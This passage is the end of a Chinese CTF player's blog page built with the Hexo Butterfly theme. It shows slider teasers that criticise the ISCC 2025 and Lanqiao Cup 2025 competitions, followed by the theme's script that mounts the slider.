class="blog-slider__text">ISCC出的misc题倒是各个方面都涉及到了（所以这就是你misc题套web前端出web题的理由吗？），图片隐写，音频隐写，内存取证，多多少少都考了一些，就是最近很多misc都考流量分析去了，ISCC没有出这方面的题（感觉是没有攻防经验啊，所以web出的依托），总的来说中规中矩</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverImages/default_bg4.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-06-24</span><a class="blog-slider__title" onclick="window.open(&quot;posts/7d288577.html&quot;);" href="javascript:void(0);" alt="">2025蓝桥杯全国总决赛部分WP</a><div class="blog-slider__text">蓝桥杯还是臭名昭著啊，把它的手伸到网安圈子里了，但是我们学校什么奖都认，老师要求没办法，（吐槽一下，蓝桥杯省赛和国赛都要分别交钱，，，，，真是垃圾比赛啊，别的网安比赛都是有奖金的，这垃圾比赛还特么收两次钱，，，）比赛的题目就是i春秋给出的题，只能说是入门题吧（应急题连应急环境都给不出来一个，，，，）（因为作者比较菜，都能写5道，其他的网安比赛作者就只能签到），反正就是给学校打的比赛，就当练练手吧</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(coverImages/default_bg8.jpg);border-radius:12px;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-05-19</span><a class="blog-slider__title" onclick="window.open(&quot;posts/9cd054c0.html&quot;);" href="javascript:void(0);" alt="">2025ISCC区域赛Web-WP</a><div class="blog-slider__text">个人感觉ISCC（以前比赛没打过，不予评价）这次比赛完全没有web的特征，区域赛5个题，每一个题开始都要misc解密（哪吒吃藕联想到food传参，我是真想不到，这题最后也是misc汉字解密），就是群里人说的（Misc套一个Web前端就是Web题了？？？），Web考点考得也不是主要的，十八铜人阵考的ssti，前面要一大段的misc解密，ShallowSeek的web考点是一个ajax头（尼克杨问号脸？？？），只能说ISCC这次举办的web题就是依托</div></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div><div class="swiper-button-prev"></div><div class="swiper-button-next"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/js/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper-lyx/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>